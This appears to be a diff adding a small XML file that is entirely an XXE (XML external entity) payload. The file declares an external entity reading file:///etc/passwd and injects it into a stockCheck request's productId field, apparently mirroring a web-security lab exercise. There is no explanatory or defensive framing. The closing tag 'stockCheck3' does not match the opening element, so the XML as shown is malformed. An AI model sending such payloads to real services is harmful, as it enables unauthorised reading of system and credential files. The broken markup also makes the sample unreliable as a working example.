@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ELEMENT stockCheck ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<stockCheck>
+    <productId>&file;</productId>
+    <storeId>1</storeId>
+</stockCheck3>
